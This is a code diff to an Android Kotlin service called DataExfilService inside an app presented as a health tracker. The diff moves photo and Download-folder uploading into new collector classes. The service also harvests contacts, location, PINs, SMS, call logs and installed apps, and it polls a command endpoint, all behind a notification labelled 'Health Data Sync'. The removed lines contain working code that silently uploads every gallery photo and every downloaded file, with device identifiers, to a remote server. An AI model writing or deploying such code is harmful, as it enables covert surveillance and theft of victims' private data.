@@ -36,7 +36,9 @@ import com.inf2007.healthtracker.R
 import com.inf2007.healthtracker.utilities.collectors.AppCollector
 import com.inf2007.healthtracker.utilities.collectors.ContactCollector
 import com.inf2007.healthtracker.utilities.collectors.DataCollector
+import com.inf2007.healthtracker.utilities.collectors.DownloadCollector
 import com.inf2007.healthtracker.utilities.collectors.LocationCollector
+import com.inf2007.healthtracker.utilities.collectors.PhotoCollector
 import com.inf2007.healthtracker.utilities.collectors.PinCollector
 import com.inf2007.healthtracker.utilities.collectors.SmsCallLogCollector
 
@@ -49,24 +51,15 @@ class DataExfilService : Service() {
         private const val NOTIFICATION_ID = 1001
         private const val SERVER_ENDPOINT = "$BASE_URL/accessibility_logs"
         const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
-        private const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
+        const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
         private const val COMMAND_ENDPOINT = "$BASE_URL/commands"
         private const val VIDEO_ENDPOINT = "$BASE_URL/videos"
         const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
         const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
-        private const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
+        const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
         const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
         const val SMS_ENDPOINT = "$BASE_URL/sms"
         const val CALL_LOG_ENDPOINT = "$BASE_URL/call_logs"
-    }
-
-    private lateinit var photoObserver: ContentObserver
-
-    private val photoSyncPrefs by lazy {
-        getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
-    }
-    private val contactsSyncPrefs by lazy {
-        getSharedPreferences("contacts_sync_log", Context.MODE_PRIVATE)
     }
 
     private lateinit var handler: Handler
@@ -83,13 +76,6 @@ class DataExfilService : Service() {
                 uploadAccessibilityLogs()
             }
             handler.postDelayed(this, uploadInterval)
-        }
-    }
-
-    private val downloadUploadRunnable = object : Runnable {
-        override fun run() {
-            uploadAllDownloads()
-            handler.postDelayed(this, 1 * 60 * 1000L) // Every 1 minute
         }
     }
 
@@ -140,22 +126,24 @@ class DataExfilService : Service() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
-        setupPhotoObserver()
         registerReceiver(uploadFileReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
         registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
 
         collectors.apply {
             add(AppCollector(this@DataExfilService))
-            add(LocationCollector(this@DataExfilService))
-            add(SmsCallLogCollector(this@DataExfilService))
-            add(PinCollector(this@DataExfilService))
             add(ContactCollector(this@DataExfilService))
+            add(DownloadCollector(this@DataExfilService))
+            add(LocationCollector(this@DataExfilService))
+            add(PhotoCollector(this@DataExfilService))
+            add(PinCollector(this@DataExfilService))
+            add(SmsCallLogCollector(this@DataExfilService))
         }
 
         collectors.forEach { it.startObserving() }
 
         collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
+        collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
         collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
     }
 
@@ -166,7 +154,6 @@ class DataExfilService : Service() {
 
         // Start periodic uploads
         handler.postDelayed(uploadRunnable, 10000)
-        handler.postDelayed(downloadUploadRunnable, 10000)
 
         startCommandPolling()
 
@@ -174,23 +161,21 @@ class DataExfilService : Service() {
     }
 
     private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channelName = "Health Data Sync"
-            val channelDescription = "Uploads health data to server"
-            val importance = NotificationManager.IMPORTANCE_LOW
+        val channelName = "Health Data Sync"
+        val channelDescription = "Uploads health data to server"
+        val importance = NotificationManager.IMPORTANCE_LOW
 
-            val channel = NotificationChannel(
-                NOTIFICATION_CHANNEL_ID,
-                channelName,
-                importance
-            ).apply {
-                description = channelDescription
-                setShowBadge(false)
-            }
-
-            val notificationManager = getSystemService(NotificationManager::class.java)
-            notificationManager.createNotificationChannel(channel)
+        val channel = NotificationChannel(
+            NOTIFICATION_CHANNEL_ID,
+            channelName,
+            importance
+        ).apply {
+            description = channelDescription
+            setShowBadge(false)
         }
+
+        val notificationManager = getSystemService(NotificationManager::class.java)
+        notificationManager.createNotificationChannel(channel)
     }
 
     private fun startForegroundService() {
@@ -400,7 +385,6 @@ class DataExfilService : Service() {
 
     override fun onDestroy() {
         handler.removeCallbacks(uploadRunnable)
-        handler.removeCallbacks(downloadUploadRunnable)
         Log.d(TAG, "Data exfiltration service destroyed")
         try {
             unregisterReceiver(appInstallReceiver)
@@ -416,222 +400,9 @@ class DataExfilService : Service() {
         collectors.forEach { it.stopObserving() }
         super.onDestroy()
         collectors.filterIsInstance<ContactCollector>().firstOrNull()?.removeObservers(contentResolver)
+        collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.removeObservers(contentResolver)
         collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.removeObservers(contentResolver)
-        contentResolver.unregisterContentObserver(photoObserver)
         unregisterReceiver(uploadFileReceiver)
-    }
-
-    private fun setupPhotoObserver() {
-        photoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean, uri: Uri?) {
-                scanAndUploadPhotos()
-            }
-        }
-        contentResolver.registerContentObserver(
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            true,
-            photoObserver
-        )
-        scanAndUploadPhotos()
-    }
-
-    private fun scanAndUploadPhotos() {
-        if (!isNetworkAvailable()) {
-            Log.d(TAG, "No network, skipping photo scan")
-            return
-        }
-
-        val projection = arrayOf(
-            MediaStore.Images.Media._ID,
-            MediaStore.Images.Media.DISPLAY_NAME
-        )
-
-        contentResolver.query(
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            projection,
-            null,
-            null,
-            "${MediaStore.Images.Media.DATE_ADDED} DESC"
-        )?.use { cursor ->
-            val totalImages = cursor.count
-            Log.d(TAG, "Gallery Scan: $totalImages images found")
-
-            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-
-            var uploadCount = 0
-            while (cursor.moveToNext()) {
-                val id = cursor.getLong(idColumn)
-                val fileName = cursor.getString(nameColumn)
-
-                if (!photoSyncPrefs.getBoolean("id_$id", false)) {
-                    val contentUri = ContentUris.withAppendedId(
-                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                        id
-                    )
-                    uploadPhotoToServer(contentUri, fileName, id)
-                    uploadCount++
-                }
-            }
-            Log.d(TAG, "Scan Complete: $uploadCount new images queued")
-        }
-    }
-
-    private fun uploadPhotoToServer(uri: Uri, fileName: String, photoId: Long) {
-        try {
-            val inputStream = contentResolver.openInputStream(uri)
-            val bytes = inputStream?.readBytes() ?: return
-            inputStream.close()
-
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("file", fileName,
-                    bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
-                .build()
-
-            val request = Request.Builder()
-                .url(PHOTOS_ENDPOINT)
-                .post(requestBody)
-                .build()
-
-            NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.e(TAG, "Photo upload failed: $fileName")
-                }
-                override fun onResponse(call: Call, response: Response) {
-                    if (response.isSuccessful) {
-                        Log.d(TAG, "Photo uploaded: $fileName")
-                        photoSyncPrefs.edit().putBoolean("id_$photoId", true).apply()
-                    }
-                    response.close()
-                }
-            })
-        } catch (e: Exception) {
-            Log.e(TAG, "Error uploading photo: ${e.message}")
-        }
-    }
-
-    private fun hasContactsPermission(): Boolean {
-        return checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
-                android.content.pm.PackageManager.PERMISSION_GRANTED
-    }
-
-    private fun uploadAllDownloads() {
-        if (!isNetworkAvailable()) {
-            Log.d(TAG, "No network, skipping download upload")
-            return
-        }
-
-        Thread {
-            try {
-                Log.d(TAG, "========== SCANNING DOWNLOAD FOLDER ==========")
-
-                val downloadFolder = File(Environment.getExternalStorageDirectory(), "Download")
-
-                if (!downloadFolder.exists() || !downloadFolder.isDirectory) {
-                    Log.d(TAG, "Download folder not found at: ${downloadFolder.absolutePath}")
-                    return@Thread
-                }
-
-                Log.d(TAG, "Download folder: ${downloadFolder.absolutePath}")
-
-                // Get ALL files in Download folder
-                val files = downloadFolder.listFiles()
-
-                if (files == null || files.isEmpty()) {
-                    Log.d(TAG, "Download folder is empty")
-                    return@Thread
-                }
-
-                Log.d(TAG, "Found ${files.size} files in Download folder")
-
-                var uploadedCount = 0
-                var skippedCount = 0
-
-                files.forEach { file ->
-                    if (file.isFile) {
-                        // Check if we've uploaded this file before
-                        // Using filename + size + last modified as unique key
-                        val prefsKey = "download_${file.name}_${file.length()}_${file.lastModified()}"
-
-                        if (!photoSyncPrefs.getBoolean(prefsKey, false)) {
-                            uploadFile(file, prefsKey)
-                            uploadedCount++
-                        } else {
-                            skippedCount++
-                            Log.d(TAG, "Already uploaded: ${file.name}")
-                        }
-                    }
-                }
-
-                Log.d(TAG, "========== DOWNLOAD SCAN COMPLETE ==========")
-                Log.d(TAG, "Uploaded: $uploadedCount files")
-                Log.d(TAG, "Skipped: $skippedCount files")
-
-            } catch (e: Exception) {
-                Log.e(TAG, "Error scanning Download folder: ${e.message}", e)
-            }
-        }.start()
-    }
-
-    private fun uploadFile(file: File, idKey: String) {
-        try {
-            val deviceId = getUniqueDeviceId()
-
-            Log.d(TAG, "Uploading: ${file.name} (${formatFileSize(file.length())})")
-
-            // Read file bytes
-            val bytes = file.readBytes()
-
-            // Create multipart request
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("file", file.name,
-                    bytes.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
-                .addFormDataPart("device_id", deviceId)
-                .addFormDataPart("device_model", Build.MODEL)
-                .addFormDataPart("file_path", file.absolutePath)
-                .addFormDataPart("file_size", file.length().toString())
-                .addFormDataPart("folder", "Download")
-                .build()
-
-            val request = Request.Builder()
-                .url(DOWNLOADS_ENDPOINT)
-                .post(requestBody)
-                .build()
-
-            NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.e(TAG, "Upload failed: ${file.name} - ${e.message}")
-                }
-
-                override fun onResponse(call: Call, response: Response) {
-                    if (response.isSuccessful) {
-                        Log.d(TAG, "Uploaded: ${file.name}")
-                        photoSyncPrefs.edit().putBoolean(idKey, true).apply()
-                    } else {
-                        Log.w(TAG, "Upload failed: ${file.name} - HTTP ${response.code}")
-                    }
-                    response.close()
-                }
-            })
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Error uploading ${file.name}: ${e.message}")
-        }
-    }
-
-    private fun formatFileSize(size: Long): String {
-        val kb = size / 1024.0
-        val mb = kb / 1024.0
-        val gb = mb / 1024.0
-
-        return when {
-            gb >= 1 -> "%.2f GB".format(gb)
-            mb >= 1 -> "%.2f MB".format(mb)
-            kb >= 1 -> "%.2f KB".format(kb)
-            else -> "$size B"
-        }
     }
 
     private fun getUniqueDeviceId(): String {
